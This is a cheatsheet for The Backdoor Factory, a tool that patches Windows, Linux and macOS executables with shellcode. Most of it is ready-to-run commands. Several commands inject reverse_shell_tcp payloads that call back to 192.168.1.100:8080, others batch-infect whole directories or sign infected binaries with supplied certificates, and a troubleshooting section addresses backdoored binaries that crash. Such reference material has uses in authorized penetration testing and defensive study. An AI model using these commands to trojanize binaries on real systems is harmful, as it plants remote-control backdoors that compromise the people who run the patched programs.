# Backdoor Factory Cheatsheet

## Quick Reference

### Installation

```bash
sudo apt update && sudo apt install backdoor-factory
# Or from source:
git clone https://github.com/secretsquirrel/the-backdoor-factory.git
cd the-backdoor-factory && ./install.sh
```

### Basic Patching

```bash
# Patch PE with existing code cave
./backdoor.py -f target.exe -H 192.168.1.100 -P 8080 -s reverse_shell_tcp

# Patch PE with appended section
./backdoor.py -f target.exe -H 192.168.1.100 -P 8080 -s reverse_shell_tcp -a

# User-supplied shellcode
msfvenom -p windows/exec CMD="calc.exe" R > calc.bin
./backdoor.py -f target.exe -s user_supplied_shellcode -U calc.bin
```

### Directory Batch Patching

```bash
./backdoor.py -d /path/to/exes/ -H 192.168.1.100 -P 8080 -s reverse_shell_tcp -a
```

### IAT-Based Payloads

```bash
./backdoor.py -f target.exe -H 192.168.1.100 -P 8080 -s iat_reverse_tcp_inline -m automatic
```

### Code Signing

```bash
# Setup certs
echo -n "password" > certs/passFile.txt
cp signingCert.cer certs/signingCert.cer
cp signingPrivateKey.pem certs/signingPrivateKey.pem

# Sign during infection
./backdoor.py -f target.exe -s iat_reverse_tcp_inline -H 192.168.1.100 -P 8080 -m automatic -C
```

### Injector Module (Windows Only)

```bash
./backdoor.py -i -H 192.168.1.100 -P 8080 -s reverse_shell_tcp -a -u .moocowwow
```

### OnionDuke Technique

```bash
./backdoor.py -f original.exe -m onionduke -b pentest.dll
```

### Supported Formats

| Format | Architecture |
|--------|-------------|
| Windows PE | x86, x64 |
| Linux ELF | x86, x64, ARM x32 LE |
| macOS Mach-O | x86, x64 |
| PE UPX | x86, x64 |

### Key Flags

| Flag | Description |
|------|-------------|
| `-f` | Target file |
| `-d` | Directory of files |
| `-H` | LHOST |
| `-P` | LPORT |
| `-s` | Shellcode type |
| `-U` | User shellcode file |
| `-a` | Append new section |
| `-C` | Enable code signing |
| `-i` | Injector mode |
| `-m` | Patch method |
| `-b` | Binary to supply |
| `-S` | Scan only |
| `-X` | XP compatibility |

### Docker Usage

```bash
docker pull secretsquirrel/the-backdoor-factory
docker run -it secretsquirrel/the-backdoor-factory bash
# ./backdoor.py -f target.exe -H 192.168.1.100 -P 8080 -s reverse_shell_tcp
```

### Troubleshooting

```bash
# "Binary not supported" → target has bound imports or NSIS
./backdoor.py -f target.exe -S  # Scan first

# Shellcode too large → use append mode
./backdoor.py -f target.exe -H 192.168.1.100 -P 8080 -s reverse_shell_tcp -a

# Backdoored binary crashes → try jump mode in interactive cave selection
```
